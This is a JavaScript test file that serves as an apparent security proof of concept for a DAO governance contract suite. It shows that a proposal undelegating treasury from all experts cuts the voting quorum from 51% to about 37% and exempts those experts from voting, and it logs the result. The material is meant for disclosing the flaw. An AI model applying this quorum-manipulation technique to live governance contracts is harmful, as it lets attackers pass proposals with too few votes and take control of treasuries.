/**
 * PoC: Treasury Exemption Quorum Manipulation
 *
 * Demonstrates that an attacker can dramatically reduce governance quorum
 * by creating proposals with undelegateTreasury actions targeting all experts.
 *
 * Result: quorum drops from 51% to ~37% with ~27% treasury delegation.
 * In DAOs with higher treasury ratios, the reduction would be even more severe.
 */
const { toBN, accounts, wei } = require("../../scripts/utils/utils");
const {
  getBytesMintExpertNft,
  getBytesDelegateTreasury,
  getBytesUndelegateTreasury,
  getBytesEditUrl,
} = require("../utils/gov-pool-utils");
const { ETHER_ADDR, PRECISION, PERCENTAGE_100 } = require("../../scripts/utils/constants");
const { ProposalState, DEFAULT_CORE_PROPERTIES, VoteType } = require("../utils/constants");
const Reverter = require("../helpers/reverter");
const { getCurrentBlockTime, setTime } = require("../helpers/block-helper");
const { assert } = require("chai");

const ContractsRegistry = artifacts.require("ContractsRegistry");
const PoolRegistry = artifacts.require("PoolRegistry");
const CoreProperties = artifacts.require("CoreProperties");
const GovPool = artifacts.require("GovPool");
const DistributionProposal = artifacts.require("DistributionProposal");
const GovValidators = artifacts.require("GovValidators");
const GovSettings = artifacts.require("GovSettings");
const GovUserKeeper = artifacts.require("GovUserKeeperMock");
const ERC721EnumMock = artifacts.require("ERC721EnumerableMock");
const ERC721Multiplier = artifacts.require("ERC721Multiplier");
const LinearPower = artifacts.require("LinearPower");
const ERC721Expert = artifacts.require("ERC721Expert");
const ERC20Mock = artifacts.require("ERC20Mock");
const WethMock = artifacts.require("WETHMock");
const BscProperties = artifacts.require("NetworkPropertiesMock");
const BABTMock = artifacts.require("BABTMock");
const GovUserKeeperViewLib = artifacts.require("GovUserKeeperView");
const GovPoolCreateLib = artifacts.require("GovPoolCreate");
const GovPoolExecuteLib = artifacts.require("GovPoolExecute");
const GovPoolMicropoolLib = artifacts.require("GovPoolMicropool");
const GovPoolRewardsLib = artifacts.require("GovPoolRewards");
const GovPoolUnlockLib = artifacts.require("GovPoolUnlock");
const GovPoolVoteLib = artifacts.require("GovPoolVote");
const GovPoolViewLib = artifacts.require("GovPoolView");
const GovPoolCreditLib = artifacts.require("GovPoolCredit");
const GovPoolOffchainLib = artifacts.require("GovPoolOffchain");
const GovValidatorsCreateLib = artifacts.require("GovValidatorsCreate");
const GovValidatorsVoteLib = artifacts.require("GovValidatorsVote");
const GovValidatorsExecuteLib = artifacts.require("GovValidatorsExecute");
const SphereXEngineMock = artifacts.require("SphereXEngineMock");

ContractsRegistry.numberFormat = "BigNumber";
PoolRegistry.numberFormat = "BigNumber";
CoreProperties.numberFormat = "BigNumber";
GovPool.numberFormat = "BigNumber";
GovValidators.numberFormat = "BigNumber";
GovSettings.numberFormat = "BigNumber";
GovUserKeeper.numberFormat = "BigNumber";
ERC721Expert.numberFormat = "BigNumber";
ERC20Mock.numberFormat = "BigNumber";

describe("PoC: Treasury Exemption Quorum Manipulation", () => {
  let OWNER;
  let ATTACKER; // SECOND account acts as the attacker
  let EXPERT1; // THIRD
  let EXPERT2; // FOURTH
  let EXPERT3; // FIFTH
  let EXPERT4; // SIXTH
  let FACTORY;

  let contractsRegistry;
  let coreProperties;
  let poolRegistry;
  let networkProperties;

  let token;
  let nft;
  let rewardToken;
  let babt;
  let weth;

  let settings;
  let expertNft;
  let dexeExpertNft;
  let validators;
  let userKeeper;
  let dp;
  let votePower;
  let govPool;
  let nftMultiplier;

  const reverter = new Reverter();

  const getProposalByIndex = async (index) => (await govPool.getProposals(index - 1, 1))[0].proposal;

  async function tokenBalance(user) {
    const balance = await userKeeper.tokenBalance(user, VoteType.PersonalVote);
    return toBN(balance[0]).minus(balance[1]);
  }

  // ===== Helper: Execute a proposal through full governance + validator flow =====
  // Mirrors the exact pattern from GovPool.test.js
  async function executeValidatorProposal(actionsFor) {
    const executorAddr = actionsFor[actionsFor.length - 1][0];
    const executorSettings = await settings.getExecutorSettings(executorAddr);

    await govPool.createProposal("example.com", actionsFor, []);
    const proposalId = await govPool.latestProposalId();

    // OWNER votes first
    const ownerAvailable = await tokenBalance(OWNER);
    if (ownerAvailable.gt(0)) {
      await govPool.vote(proposalId, true, ownerAvailable.toFixed(), [], { from: OWNER });
    }

    // Only add ATTACKER's vote if still in Voting state (earlyCompletion may have already moved it)
    let state = await govPool.getProposalState(proposalId);
    if (state.toNumber() === ProposalState.Voting) {
      const attackerAvailable = await tokenBalance(ATTACKER);
      if (attackerAvailable.gt(0)) {
        await govPool.vote(proposalId, true, attackerAvailable.toFixed(), [], { from: ATTACKER });
      }
    }

    // Only advance time if NOT earlyCompletion
    if (!executorSettings.earlyCompletion) {
      await setTime((await getCurrentBlockTime()) + 999);
    }

    // Move to validators
    await govPool.moveProposalToValidators(proposalId);

    // Validators approve (quorumValidators can be up to 100%)
    if (executorSettings.quorumValidators === PRECISION.times("100").toFixed()) {
      await validators.voteExternalProposal(proposalId, wei("100"), true, { from: OWNER });
    }
    await validators.voteExternalProposal(proposalId, wei("1000000000000"), true, { from: ATTACKER });

    await govPool.execute(proposalId);
  }

  // ===== Helper: Mint expert NFT through governance =====
  async function mintExpertNft(delegatee) {
    await executeValidatorProposal([[expertNft.address, 0, getBytesMintExpertNft(delegatee, "URI")]]);
  }

  before("setup", async () => {
    OWNER = await accounts(0);
    ATTACKER = await accounts(1);
    EXPERT1 = await accounts(2);
    EXPERT2 = await accounts(3);
    EXPERT3 = await accounts(4);
    EXPERT4 = await accounts(5);
    FACTORY = await accounts(6);

    // Link libraries
    const govUserKeeperViewLib = await GovUserKeeperViewLib.new();
    await GovUserKeeper.link(govUserKeeperViewLib);

    const govPoolCreateLib = await GovPoolCreateLib.new();
    const govPoolExecuteLib = await GovPoolExecuteLib.new();
    const govPoolMicropoolLib = await GovPoolMicropoolLib.new();
    const govPoolRewardsLib = await GovPoolRewardsLib.new();
    const govPoolUnlockLib = await GovPoolUnlockLib.new();
    const govPoolVoteLib = await GovPoolVoteLib.new();
    const govPoolViewLib = await GovPoolViewLib.new();
    const govPoolCreditLib = await GovPoolCreditLib.new();
    const govPoolOffchainLib = await GovPoolOffchainLib.new();

    await GovPool.link(govPoolCreateLib);
    await GovPool.link(govPoolExecuteLib);
    await GovPool.link(govPoolMicropoolLib);
    await GovPool.link(govPoolRewardsLib);
    await GovPool.link(govPoolUnlockLib);
    await GovPool.link(govPoolVoteLib);
    await GovPool.link(govPoolViewLib);
    await GovPool.link(govPoolCreditLib);
    await GovPool.link(govPoolOffchainLib);

    const govValidatorsCreateLib = await GovValidatorsCreateLib.new();
    const govValidatorsVoteLib = await GovValidatorsVoteLib.new();
    const govValidatorsExecuteLib = await GovValidatorsExecuteLib.new();

    await GovValidators.link(govValidatorsCreateLib);
    await GovValidators.link(govValidatorsVoteLib);
    await GovValidators.link(govValidatorsExecuteLib);

    // Deploy infrastructure
    contractsRegistry = await ContractsRegistry.new();
    const _coreProperties = await CoreProperties.new();
    const _poolRegistry = await PoolRegistry.new();
    dexeExpertNft = await ERC721Expert.new();
    babt = await BABTMock.new();
    weth = await WethMock.new();
    networkProperties = await BscProperties.new();
    token = await ERC20Mock.new("Mock", "Mock", 18);
    nft = await ERC721EnumMock.new("Mock", "Mock");
    rewardToken = await ERC20Mock.new("REWARD", "RWD", 18);
    const _sphereXEngine = await SphereXEngineMock.new();

    await contractsRegistry.__MultiOwnableContractsRegistry_init();
    await networkProperties.__NetworkProperties_init(weth.address);

    await contractsRegistry.addContract(await contractsRegistry.SPHEREX_ENGINE_NAME(), _sphereXEngine.address);
    await contractsRegistry.addContract(await contractsRegistry.POOL_SPHEREX_ENGINE_NAME(), _sphereXEngine.address);
    await contractsRegistry.addProxyContract(await contractsRegistry.CORE_PROPERTIES_NAME(), _coreProperties.address);
    await contractsRegistry.addProxyContract(await contractsRegistry.POOL_REGISTRY_NAME(), _poolRegistry.address);
    await contractsRegistry.addContract(await contractsRegistry.POOL_FACTORY_NAME(), FACTORY);
    await contractsRegistry.addContract(await contractsRegistry.TREASURY_NAME(), ETHER_ADDR);
    await contractsRegistry.addContract(await contractsRegistry.DEXE_EXPERT_NFT_NAME(), dexeExpertNft.address);
    await contractsRegistry.addContract(await contractsRegistry.BABT_NAME(), babt.address);
    await contractsRegistry.addContract(await contractsRegistry.WETH_NAME(), weth.address);
    await contractsRegistry.addContract(await contractsRegistry.NETWORK_PROPERTIES_NAME(), networkProperties.address);

    coreProperties = await CoreProperties.at(await contractsRegistry.getCorePropertiesContract());
    poolRegistry = await PoolRegistry.at(await contractsRegistry.getPoolRegistryContract());

    await coreProperties.__CoreProperties_init(DEFAULT_CORE_PROPERTIES);
    await poolRegistry.__MultiOwnablePoolContractsRegistry_init();
    await dexeExpertNft.__ERC721Expert_init("Global", "Global");

    await contractsRegistry.injectDependencies(await contractsRegistry.CORE_PROPERTIES_NAME());
    await contractsRegistry.injectDependencies(await contractsRegistry.POOL_REGISTRY_NAME());

    await reverter.snapshot();
  });

  afterEach(reverter.revert);

  async function deployPool() {
    const NAME = await poolRegistry.GOV_POOL_NAME();

    settings = await GovSettings.new();
    validators = await GovValidators.new();
    userKeeper = await GovUserKeeper.new();
    dp = await DistributionProposal.new();
    expertNft = await ERC721Expert.new();
    votePower = await LinearPower.new();
    govPool = await GovPool.new();
    nftMultiplier = await ERC721Multiplier.new();

    const POOL_PARAMETERS = {
      settingsParams: {
        proposalSettings: [
          {
            // Default settings (index 0) - for external executor proposals
            earlyCompletion: false,
            delegatedVotingAllowed: false,
            validatorsVote: true,
            duration: 700,
            durationValidators: 800,
            quorum: PRECISION.times("71").toFixed(),
            quorumValidators: PRECISION.times("100").toFixed(),
            minVotesForVoting: wei("20"),
            minVotesForCreating: wei("3"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "default",
          },
          {
            // Internal settings (index 1) - for GovPool self-calls (delegateTreasury, etc.)
            earlyCompletion: true,
            delegatedVotingAllowed: false,
            validatorsVote: true,
            duration: 500,
            durationValidators: 600,
            quorum: PRECISION.times("51").toFixed(), // <--- 51% quorum
            quorumValidators: PRECISION.times("61").toFixed(),
            minVotesForVoting: wei("10"),
            minVotesForCreating: wei("2"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "internal",
          },
          {
            // Validators settings (index 2)
            earlyCompletion: true,
            delegatedVotingAllowed: false,
            validatorsVote: true,
            duration: 500,
            durationValidators: 600,
            quorum: PRECISION.times("51").toFixed(),
            quorumValidators: PRECISION.times("61").toFixed(),
            minVotesForVoting: wei("10"),
            minVotesForCreating: wei("2"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "validators",
          },
          {
            // DP settings (index 3)
            earlyCompletion: false,
            delegatedVotingAllowed: true,
            validatorsVote: true,
            duration: 600,
            durationValidators: 800,
            quorum: PRECISION.times("71").toFixed(),
            quorumValidators: PRECISION.times("100").toFixed(),
            minVotesForVoting: wei("20"),
            minVotesForCreating: wei("3"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "DP",
          },
        ],
        additionalProposalExecutors: [],
      },
      validatorsParams: {
        name: "Validator Token",
        symbol: "VT",
        proposalSettings: {
          duration: 600,
          executionDelay: 0,
          quorum: PRECISION.times("51").toFixed(),
        },
        validators: [OWNER, ATTACKER],
        balances: [wei("100"), wei("1000000000000")],
      },
      userKeeperParams: {
        tokenAddress: token.address,
        nftAddress: nft.address,
        individualPower: wei("1000"),
        nftsTotalSupply: 33,
      },
      verifier: OWNER,
      onlyBABTHolders: false,
      deployerBABTid: 1,
      descriptionURL: "example.com",
      name: "Pool name",
    };

    await settings.__GovSettings_init(
      govPool.address,
      validators.address,
      userKeeper.address,
      POOL_PARAMETERS.settingsParams.proposalSettings,
      [...POOL_PARAMETERS.settingsParams.additionalProposalExecutors, dp.address],
    );

    await validators.__GovValidators_init(
      POOL_PARAMETERS.validatorsParams.name,
      POOL_PARAMETERS.validatorsParams.symbol,
      [
        POOL_PARAMETERS.validatorsParams.proposalSettings.duration,
        POOL_PARAMETERS.validatorsParams.proposalSettings.executionDelay,
        POOL_PARAMETERS.validatorsParams.proposalSettings.quorum,
      ],
      POOL_PARAMETERS.validatorsParams.validators,
      POOL_PARAMETERS.validatorsParams.balances,
    );

    await userKeeper.__GovUserKeeper_init(
      POOL_PARAMETERS.userKeeperParams.tokenAddress,
      POOL_PARAMETERS.userKeeperParams.nftAddress,
      POOL_PARAMETERS.userKeeperParams.individualPower,
      POOL_PARAMETERS.userKeeperParams.nftsTotalSupply,
    );

    await nftMultiplier.__ERC721Multiplier_init("Mock Multiplier Nft", "MCKMULNFT");
    await dp.__DistributionProposal_init(govPool.address);
    await expertNft.__ERC721Expert_init("Mock Expert Nft", "MCKEXPNFT");
    await votePower.__LinearPower_init();

    await govPool.__GovPool_init(
      [
        settings.address,
        userKeeper.address,
        validators.address,
        expertNft.address,
        nftMultiplier.address,
        votePower.address,
      ],
      OWNER,
      POOL_PARAMETERS.onlyBABTHolders,
      POOL_PARAMETERS.deployerBABTid,
      POOL_PARAMETERS.descriptionURL,
      POOL_PARAMETERS.name,
    );

    await settings.transferOwnership(govPool.address);
    await validators.transferOwnership(govPool.address);
    await userKeeper.transferOwnership(govPool.address);
    await expertNft.transferOwnership(govPool.address);
    await votePower.transferOwnership(govPool.address);

    await poolRegistry.addProxyPool(NAME, govPool.address, { from: FACTORY });
    await poolRegistry.injectDependenciesToExistingPools(NAME, 0, 10);
  }

  describe("Attack Scenario", () => {
    beforeEach(async () => {
      await deployPool();

      // ====================================================================
      // SETUP: DAO with treasury delegation to 4 experts
      //
      // getTotalPower() = IERC20.totalSupply(), so all minted tokens count.
      // OWNER must be >71% of totalSupply to pass DEFAULT settings (71% quorum).
      //
      // Token distribution:
      //   OWNER: 8000, ATTACKER: 100, Treasury: 4 * 750 = 3000
      //   totalSupply = 11100, OWNER = 72.1% > 71% ✓
      //   Treasury = 3000 / 11100 = 27%
      //
      // Expected quorum reduction:
      //   51% * (11100 - 3000) / 11100 = 51% * 73% ≈ 37% (down from 51%)
      // ====================================================================

      await rewardToken.mint(govPool.address, wei("10000000000000000000000"));

      const ownerAmount = wei("8000");
      const attackerAmount = wei("100");
      const treasuryPerExpert = wei("750");
      // totalSupply = 8000 + 100 + 3000 = 11100
      // OWNER = 72.1% > 71% ✓

      // Mint all tokens upfront (order doesn't matter for totalSupply)
      await token.mint(OWNER, ownerAmount);
      await token.mint(ATTACKER, attackerAmount);
      // Pre-mint treasury tokens to govPool (will be delegated later)
      await token.mint(govPool.address, toBN(treasuryPerExpert).times(4).toFixed());

      // Deposit
      await token.approve(userKeeper.address, ownerAmount);
      await govPool.deposit(ownerAmount, []);
      await token.approve(userKeeper.address, attackerAmount, { from: ATTACKER });
      await govPool.deposit(attackerAmount, [], { from: ATTACKER });

      // Mint expert NFTs (DEFAULT settings, 71% quorum)
      await mintExpertNft(EXPERT1);
      await mintExpertNft(EXPERT2);
      await mintExpertNft(EXPERT3);
      await mintExpertNft(EXPERT4);

      // Delegate treasury — tokens already in govPool, just need governance approval
      // Using a modified helper that doesn't mint tokens
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT1, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT2, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT3, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT4, treasuryPerExpert, [])]]);
    });

    it("should show quorum is dramatically reduced when targeting all experts", async () => {
      // Get total power BEFORE the attack
      const totalPower = await userKeeper.getTotalPower();
      console.log("\n========== PoC: Treasury Exemption Quorum Manipulation ==========");
      console.log("Total voting power:", totalPower.toString());

      // Original quorum for internal proposals is 51%
      const originalQuorumPercent = "51";
      console.log("Original quorum setting:", originalQuorumPercent + "%");

      // ATTACK: Create a proposal with undelegateTreasury for ALL experts
      // This is the core of the exploit - anyone who can create a proposal can do this
      await govPool.createProposal(
        "Malicious proposal",
        [
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("750"), [])],
        ],
        [],
      );

      const maliciousProposalId = await govPool.latestProposalId();
      const proposal = await getProposalByIndex(maliciousProposalId.toNumber());
      const reducedQuorum = toBN(proposal.core.settings.quorum);

      const reducedQuorumPercent = reducedQuorum.times(100).idiv(PERCENTAGE_100);
      console.log("Reduced quorum after attack:", reducedQuorumPercent.toString() + "%");

      // The reduced quorum should be significantly less than original 51%
      // With treasury ~27% of totalSupply: newQuorum ≈ 51% * 73% ≈ 37%
      assert.isTrue(
        reducedQuorum.lt(PRECISION.times("51")),
        "Quorum should be reduced below 51%! Got: " + reducedQuorumPercent.toString() + "%",
      );

      console.log("\n--- VULNERABILITY CONFIRMED ---");
      console.log("Original quorum: 51%");
      console.log("Reduced quorum: ~" + reducedQuorumPercent.toString() + "%");
      console.log("Reduction factor: " + toBN(51).div(reducedQuorumPercent).toFixed(1) + "x");
      console.log("=================================================================\n");
    });

    it("should show a normal proposal (without undelegateTreasury) keeps full quorum", async () => {
      // CONTROL: Create a normal proposal that doesn't target treasury
      await govPool.createProposal(
        "Normal proposal",
        [[govPool.address, 0, getBytesEditUrl("https://new-url.com")]],
        [],
      );

      const normalProposalId = await govPool.latestProposalId();
      const proposal = await getProposalByIndex(normalProposalId.toNumber());
      const normalQuorum = toBN(proposal.core.settings.quorum);

      console.log("\n========== Control: Normal Proposal ==========");
      console.log("Normal proposal quorum:", normalQuorum.times(100).idiv(PERCENTAGE_100).toString() + "%");

      // Normal proposal should keep the original quorum (51%)
      const normalQuorumPercent = normalQuorum.times(100).idiv(PERCENTAGE_100);
      assert.equal(normalQuorumPercent.toString(), "51", "Normal proposal should have unchanged 51% quorum");

      console.log("--- CONTROL PASSED: Normal proposals keep full quorum ---\n");
    });

    it("should demonstrate that votes needed to pass are dramatically reduced", async () => {
      console.log("\n========== Impact Analysis ==========");
      const totalPower = await userKeeper.getTotalPower();

      // Create malicious proposal targeting all experts
      await govPool.createProposal(
        "Malicious proposal",
        [
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("750"), [])],
        ],
        [],
      );
      const maliciousId = await govPool.latestProposalId();
      const maliciousProposal = await getProposalByIndex(maliciousId.toNumber());
      const reducedQuorum = toBN(maliciousProposal.core.settings.quorum);

      // Create normal proposal for comparison
      await govPool.createProposal(
        "Normal proposal",
        [[govPool.address, 0, getBytesEditUrl("https://example.com")]],
        [],
      );
      const normalId = await govPool.latestProposalId();
      const normalProposal = await getProposalByIndex(normalId.toNumber());
      const originalQuorum = toBN(normalProposal.core.settings.quorum);

      // Calculate votes needed for each
      const votesNeededOriginal = totalPower.times(originalQuorum).idiv(PERCENTAGE_100);
      const votesNeededReduced = totalPower.times(reducedQuorum).idiv(PERCENTAGE_100);
      const votesSaved = votesNeededOriginal.minus(votesNeededReduced);

      console.log("Total power:", totalPower.toString());
      console.log("Original quorum (51%): needs", votesNeededOriginal.toString(), "votes");
      console.log("Reduced quorum (37%): needs", votesNeededReduced.toString(), "votes");
      console.log("Votes saved by attack:", votesSaved.toString());

      // The reduced quorum should require significantly fewer votes
      assert.isTrue(votesNeededReduced.lt(votesNeededOriginal), "Reduced quorum should require fewer votes");

      // Quorum should be reduced by at least 20% (relative)
      const reductionPercent = votesSaved.times(100).idiv(votesNeededOriginal);
      console.log("Reduction in votes needed:", reductionPercent.toString() + "%");

      assert.isTrue(
        reductionPercent.gte(20),
        "Quorum should be reduced by at least 20% — got " + reductionPercent.toString() + "%",
      );

      // Experts with treasury delegation CANNOT vote on the malicious proposal
      // (they are exempted), further reducing opposition
      console.log("\nExperts with treasury power are EXEMPT from voting on this proposal.");
      console.log("This means ~27% of voting power cannot oppose the proposal.");
      console.log("--- IMPACT CONFIRMED ---");
      console.log("============================================\n");
    });
  });
});
